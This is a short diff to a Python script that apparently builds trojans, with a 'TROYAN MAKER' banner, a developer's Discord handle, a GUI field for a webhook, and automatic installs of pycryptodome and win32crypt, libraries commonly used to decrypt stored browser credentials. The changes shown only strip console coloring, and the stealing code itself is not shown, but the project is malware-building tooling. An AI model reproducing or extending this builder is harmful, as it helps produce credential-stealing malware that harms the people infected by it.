@@ -35,10 +35,6 @@ try:
 except:
     os.system(f"{sys.executable} -m pip install pycryptodome")
 try:
-    from colorama import *
-except:
-    os.system(f"{sys.executable} -m pip install colorama")
-try:
     import win32crypt
 except:
     os.system(f"{sys.executable} -m pip install pypiwin32")
@@ -63,15 +59,15 @@ def build():
 
          
 
-    print(f""" {Fore.BLUE}
+    print("""
 ████████╗██████╗  ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗    ███╗   ███╗ █████╗ ██╗  ██╗███████╗██████╗ 
 ╚══██╔══╝██╔══██╗██╔═══██╗╚██╗ ██╔╝██╔══██╗████╗  ██║    ████╗ ████║██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
    ██║   ██████╔╝██║   ██║ ╚████╔╝ ███████║██╔██╗ ██║    ██╔████╔██║███████║█████╔╝ █████╗  ██████╔╝
    ██║   ██╔══██╗██║   ██║  ╚██╔╝  ██╔══██║██║╚██╗██║    ██║╚██╔╝██║██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
    ██║   ██║  ██║╚██████╔╝   ██║   ██║  ██║██║ ╚████║    ██║ ╚═╝ ██║██║  ██║██║  ██╗███████╗██║  ██║
-   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ {Fore.Style_RESET_ALL}
+   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 
-   Dev: {Fore.GREEN}KentMG#0069 {Fore.Style_RESET_ALL}                                                          
+   Dev: KentMG#0069                                                       
     """)
     layout = [
         [sg.Text('Webhook', size=(15, 1)), sg.Input(size=(40, 1), key="webhook")],
